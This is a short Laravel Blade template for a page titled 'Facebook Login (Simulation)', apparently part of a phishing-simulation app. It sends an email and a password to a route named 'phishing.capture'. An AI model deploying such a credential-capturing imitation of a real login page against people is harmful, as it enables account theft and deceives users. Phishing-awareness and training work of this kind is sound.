@extends('layouts.app')

@section('content')
<div class="container">
    <h2>Facebook Login (Simulation)</h2>
    <form method="POST" action="{{ route('phishing.capture') }}">
        @csrf
        <div class="mb-3">
            <label>Email</label>
            <input type="email" name="email" class="form-control" required>
        </div>

        <div class="mb-3">
            <label>Password</label>
            <input type="password" name="password" class="form-control" required>
        </div>

        <button type="submit" class="btn btn-primary">Log In</button>
    </form>
</div>
@endsection
